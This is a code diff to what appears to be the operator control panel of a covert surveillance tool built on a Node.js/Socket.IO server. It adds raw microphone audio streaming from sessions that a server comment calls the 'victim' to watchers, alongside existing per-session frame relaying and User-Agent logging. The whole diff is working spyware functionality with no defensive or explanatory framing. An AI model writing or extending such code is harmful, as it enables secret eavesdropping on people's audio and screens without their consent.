@@ -202,6 +202,10 @@ app.get('/control', (req, res) => {
       }
     }
 
+    var audioCtx = null;
+    var gainNodes = {};
+    var nextPlayTime = {};
+
     function setupSession(sid) {
       if (document.getElementById('card-' + sid)) return;
 
@@ -223,8 +227,24 @@ app.get('/control', (req, res) => {
       
       var btnAudio = document.createElement('button');
       btnAudio.className = 'btn-audio';
-      btnAudio.textContent = '🔊 Audio (N/A)';
-      btnAudio.disabled = true;
+      btnAudio.textContent = '🔊 Unmute Audio';
+      btnAudio.onclick = function() {
+        if (!audioCtx) {
+          audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+        }
+        audioCtx.resume();
+        var gn = gainNodes[sid];
+        if (gn) {
+          if (gn.gain.value === 0) {
+            gn.gain.value = 1;
+            btnAudio.textContent = '🔇 Mute Audio';
+            addLog('🔊 Audio unmuted for ' + sid);
+          } else {
+            gn.gain.value = 0;
+            btnAudio.textContent = '🔊 Unmute Audio';
+          }
+        }
+      };
 
       var btnSnap = document.createElement('button');
       btnSnap.className = 'btn-snap';
@@ -268,6 +288,40 @@ app.get('/control', (req, res) => {
       };
       socket.on('frame-' + sid, frameFn);
       frameListeners[sid].push({ event: 'frame-' + sid, fn: frameFn });
+
+      // Listen for audio chunks (raw PCM Int16 at 16kHz)
+      var audioFn = function(data) {
+        if (!audioCtx) {
+          audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
+        }
+        if (!gainNodes[sid]) {
+          gainNodes[sid] = audioCtx.createGain();
+          gainNodes[sid].gain.value = 0; // Start muted
+          gainNodes[sid].connect(audioCtx.destination);
+        }
+
+        var int16 = new Int16Array(data);
+        var float32 = new Float32Array(int16.length);
+        for (var i = 0; i < int16.length; i++) {
+          float32[i] = int16[i] / 32768.0;
+        }
+
+        var buffer = audioCtx.createBuffer(1, float32.length, 16000);
+        buffer.getChannelData(0).set(float32);
+
+        var source = audioCtx.createBufferSource();
+        source.buffer = buffer;
+        source.connect(gainNodes[sid]);
+
+        var now = audioCtx.currentTime;
+        if (!nextPlayTime[sid] || nextPlayTime[sid] < now) {
+          nextPlayTime[sid] = now + 0.05; // Small buffer
+        }
+        source.start(nextPlayTime[sid]);
+        nextPlayTime[sid] += buffer.duration;
+      };
+      socket.on('audio-' + sid, audioFn);
+      frameListeners[sid].push({ event: 'audio-' + sid, fn: audioFn });
 
       addLog('📺 Watching stream from ' + sid);
 
@@ -383,6 +437,13 @@ User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}
   socket.on('frame', (data) => {
     if (socket.sessionId) {
       io.to('watch-' + socket.sessionId).emit('frame-' + socket.sessionId, data);
+    }
+  });
+
+  // Victim sends audio chunk → relay to watchers
+  socket.on('audio', (data) => {
+    if (socket.sessionId) {
+      io.to('watch-' + socket.sessionId).volatile.emit('audio-' + socket.sessionId, data);
     }
   });
 
